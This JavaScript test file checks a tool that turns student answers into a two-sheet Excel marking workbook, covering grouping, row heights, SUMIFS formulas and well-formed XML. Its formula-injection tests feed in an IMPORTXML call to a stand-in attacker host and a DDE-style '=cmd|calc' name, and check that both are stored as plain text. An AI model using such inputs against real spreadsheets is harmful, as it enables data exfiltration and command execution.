import { describe, it, expect } from 'vitest';
import {
  markingWorkbook,
  answersOf,
  heightFor,
  gradeColumn,
  GRADE_HEADERS,
  WRITTEN_MAX,
} from './workbook.js';

/** The same stored-ZIP reader the writer's own test uses. */
function unzip(bytes) {
  const dv = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const dec = new TextDecoder();
  const out = {};
  let at = 0;
  while (at + 4 <= bytes.length && dv.getUint32(at, true) === 0x04034b50) {
    const size = dv.getUint32(at + 18, true);
    const nameLen = dv.getUint16(at + 26, true);
    const extraLen = dv.getUint16(at + 28, true);
    const name = dec.decode(bytes.subarray(at + 30, at + 30 + nameLen));
    const from = at + 30 + nameLen + extraLen;
    out[name] = dec.decode(bytes.subarray(from, from + size));
    at = from + size;
  }
  return out;
}

const row = (over = {}) => ({
  cls: '1-A',
  no: '07',
  name: 'Ana Lopez',
  assignment: 'The Gift of the Magi — Reading 3 Written',
  scoreNum: '',
  totalNum: '',
  percentNum: '',
  minutes: 12,
  when: '2026-08-24T10:00:00.000Z',
  retried: '',
  attempts: 1,
  payload: { items: [] },
  ...over,
});

const written = (answers, over = {}) =>
  row({
    payload: {
      items: answers.map(([question, answer], i) => ({
        question,
        answer,
        segment: `s${i + 1}`,
      })),
    },
    ...over,
  });

const parts = (rows) => unzip(markingWorkbook(rows));
const grades = (rows) => parts(rows)['xl/worksheets/sheet1.xml'];
const answersXml = (rows) => parts(rows)['xl/worksheets/sheet2.xml'];

describe('there is nothing to mark', () => {
  it('gives nothing back rather than an empty file', () => {
    expect(markingWorkbook([])).toBeNull();
    expect(markingWorkbook(null)).toBeNull();
  });
});

describe('the answers, grouped by question', () => {
  const rows = [
    written([['Why does Della cry?', 'Because she is poor.']], { name: 'Ana Lopez' }),
    written([['Why does Della cry?', 'She has no money for a present.']], { name: 'Ben Ito' }),
    written([['What does Jim sell?', 'His watch.']], { name: 'Ana Lopez' }),
  ];

  it('puts every answer to one question together', () => {
    /* a teacher marking thirty answers to the same question has one
       standard in their head; jumping between questions rebuilds it
       thirty times */
    const all = answersOf(rows).map((a) => a.q);
    expect(all).toEqual([...all].sort());
  });

  it('counts them in the band above each group', () => {
    expect(answersXml(rows)).toContain('Why does Della cry?   (2 answers)');
    expect(answersXml(rows)).toContain('What does Jim sell?   (1 answer)');
  });

  it('carries the student on every row, so a mark can be traced back', () => {
    const x = answersXml(rows);
    expect(x).toContain('Ana Lopez');
    expect(x).toContain('Ben Ito');
    expect(x).toContain('1-A');
  });

  it('skips an answer that was never written', () => {
    const blank = written([
      ['Answered', 'Something'],
      ['Not answered', '   '],
    ]);
    expect(answersOf([blank]).map((a) => a.q)).toEqual(['Answered']);
  });

  it('gives each answer a yellow box to type a mark into', () => {
    /* style 4 is the input style */
    expect(answersXml(rows)).toContain('s="4"');
  });

  it('says out of what, on every row', () => {
    expect(answersXml(rows)).toContain(`<v>${WRITTEN_MAX}</v>`);
  });

  it('tells the teacher not to edit the other sheet', () => {
    expect(answersXml(rows)).toContain('you never edit that sheet');
  });

  it('keeps the two header rows on screen while a hundred answers scroll', () => {
    expect(answersXml(rows)).toContain('ySplit="2"');
    expect(answersXml(rows)).toContain('state="frozen"');
  });
});

describe('a row is as tall as its answer needs', () => {
  it('gives one line to a short answer', () => {
    expect(heightFor('His watch.')).toBe(19);
  });

  it('gives a paragraph the room it needs', () => {
    expect(heightFor('x'.repeat(300))).toBeGreaterThan(heightFor('x'.repeat(20)));
  });

  it('counts the line breaks a student typed', () => {
    expect(heightFor('one\ntwo\nthree')).toBeGreaterThan(heightFor('one two three'));
  });

  it('stops before a row taller than the screen', () => {
    expect(heightFor('x'.repeat(100_000))).toBe(220);
  });
});

describe('the grade table', () => {
  const rows = [
    written([['Why does Della cry?', 'Because she is poor.']]),
    row({ name: 'Ben Ito', no: '08', scoreNum: 25, totalNum: 28, percentNum: 89.3 }),
  ];

  it('has one row per student, under a full set of headings', () => {
    const x = grades(rows);
    for (const h of GRADE_HEADERS) expect(x, `no ${h} column`).toContain(h);
    expect(x).toContain('Ana Lopez');
    expect(x).toContain('Ben Ito');
  });

  it('brings the marks over from the Answers sheet by itself', () => {
    /* the whole point: a teacher types in one place */
    const x = grades(rows);
    expect(x).toContain('SUMIFS(Answers!$F:$F');
    expect(x).toContain('SUMIFS(Answers!$G:$G');
  });

  it('matches on class and name, which a teacher can see and correct', () => {
    expect(grades(rows)).toContain('Answers!$A:$A,$A2,Answers!$C:$C,$C2');
  });

  it('adds the automatic and the written together', () => {
    const x = grades(rows);
    expect(x).toContain('<f>E2+H2</f>');
    expect(x).toContain('<f>F2+I2</f>');
  });

  it('leaves the percentage blank rather than dividing by zero', () => {
    expect(grades(rows)).toContain('IF(K2=0,&quot;&quot;,ROUND(J2/K2*100,1))');
  });

  it('numbers the formulas for the row they land on', () => {
    const x = grades(rows);
    expect(x).toContain('E2+H2');
    expect(x).toContain('E3+H3');
  });

  it('does not reach for a sheet that has nothing on it', () => {
    /* a quiz-only class has no written answers; SUMIFS over an empty
       sheet is a formula that can only ever say zero */
    const quizOnly = [row({ scoreNum: 25, totalNum: 28, percentNum: 89.3 })];
    expect(grades(quizOnly)).not.toContain('SUMIFS');
  });

  it('keeps the names on screen while the columns scroll', () => {
    expect(grades(rows)).toContain('xSplit="3"');
  });

  it('sorts by class, then number, then name', () => {
    const shuffled = [
      row({ cls: '1-B', no: '02', name: 'Zoe' }),
      row({ cls: '1-A', no: '09', name: 'Ana' }),
      row({ cls: '1-A', no: '01', name: 'Ben' }),
    ];
    const x = grades(shuffled);
    expect(x.indexOf('Ben')).toBeLessThan(x.indexOf('Ana'));
    expect(x.indexOf('Ana')).toBeLessThan(x.indexOf('Zoe'));
  });

  it('says which column is which, for anyone reading the formulas', () => {
    expect(gradeColumn('Auto score')).toBe('E');
    expect(gradeColumn('Written score')).toBe('H');
    expect(gradeColumn('Total')).toBe('J');
  });
});

describe('what a student typed cannot become a formula', () => {
  it('writes an answer that starts with = as text', () => {
    const nasty = written([['Why does Della cry?', '=IMPORTXML("http://evil.example","//x")']]);
    const x = answersXml([nasty]);
    expect(x).toContain('t="inlineStr"');
    expect(x).not.toContain('<f>IMPORTXML');
  });

  it('writes a name that starts with = as text', () => {
    const x = grades([written([['Q', 'A']], { name: '=cmd|calc' })]);
    expect(x).not.toContain('<f>cmd');
    expect(x).toContain('=cmd|calc');
  });
});

describe('the file it produces', () => {
  it('is a workbook with the two sheets, named', () => {
    const wb = parts([written([['Q', 'A']])])['xl/workbook.xml'];
    expect(wb).toContain('name="Grades"');
    expect(wb).toContain('name="Answers"');
    /* Grades first, because that is the sheet that opens */
    expect(wb.indexOf('Grades')).toBeLessThan(wb.indexOf('Answers'));
  });

  it('is well-formed XML throughout, with a student’s worst input in it', () => {
    const bad = written([
      ['Why <b>cry</b> & "so"?', 'She said "no" & <left> — ' + String.fromCharCode(7)],
    ]);
    const parser = new DOMParser();
    for (const [name, text] of Object.entries(parts([bad]))) {
      const doc = parser.parseFromString(text, 'application/xml');
      expect(doc.querySelector('parsererror'), `${name} is not well-formed`).toBeNull();
    }
  });
});
